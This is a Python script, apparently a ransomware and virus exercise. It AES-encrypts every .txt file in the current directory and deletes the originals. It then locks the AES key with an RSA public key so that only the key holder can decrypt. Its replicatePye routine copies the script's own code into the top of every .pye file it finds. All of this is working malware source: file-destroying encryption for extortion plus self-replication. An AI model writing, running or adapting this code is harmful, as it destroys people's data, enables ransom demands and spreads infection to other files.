
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode

import os,glob,sys,base64


            
def encryptAES(aesKey):
    
    recipient_key =RSA.import_key(open("public.pem").read())
    file_out = open("key.bin", "wb")
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_key = cipher_rsa.encrypt(aesKey)
    file_out.write(enc_key)
    file_out.close()           
    print("symmetric key encypted...")

def replicatePye():
    
    
    vfilein = open(sys.argv[0],'r')
    vcontents = vfilein.readlines()
    vfilein.close()


    for item in glob.glob("*.pye"):

        filein = open(item,'r')
        all_contents = filein.readlines()
        filein.close()
        fileout = open(item,'w') 
        fileout.writelines(vcontents)
        all_contents = ['#' + line for line in all_contents]
        fileout.writelines(all_contents)
        fileout.close()




def main():

    #random 256 bits key
    symkey = get_random_bytes(32)
    cipher = AES.new(symkey,AES.MODE_CBC)
    iv = cipher.iv
    print("Main IV : {}".format(iv))
    #iv = base64.b64encode(cipher.iv)
     
    #encrypts the .txt files in the current directory folder...
    cwd = os.getcwd()     
    os.chdir(cwd)
    #encrypt_files(symkey)
    for filename in glob.glob("*.txt"):
        with open (filename,"rb") as fname:
            cipher = AES.new(symkey,AES.MODE_CBC,iv)
#            cipher.iv = iv
            #print("{} IV : {}".format(filename,cipher.iv))
            #print("{} IV decode : {}".format(filename,b64encode(cipher.iv).decode('utf-8')))
            
            #read all file data
            file_data =fname.read()
            #file_data = base64.b64encode(file_data)
            encrypted_data = cipher.encrypt(pad(file_data,AES.block_size))
            encoded = b64encode(encrypted_data).decode('utf-8')
            print("{} encrypted..".format(filename))
            #encd = base64.b64encode(encrypted_data)
            
            with open(filename.replace(".txt",".enc"),"w") as file:
                file.write(encoded)
        os.remove(filename)
    
    
    iv = b64encode(iv).decode('utf-8')
    with open('cipher_iv.txt','w') as txt:
        txt.write(iv)
        txt.close()       
    print("cipher_iv saved...")

    #encrypt the AES symmetric key with the RSA public key
    encryptAES(symkey)
    
    replicatePye()
    

if __name__ == '__main__':
    main()


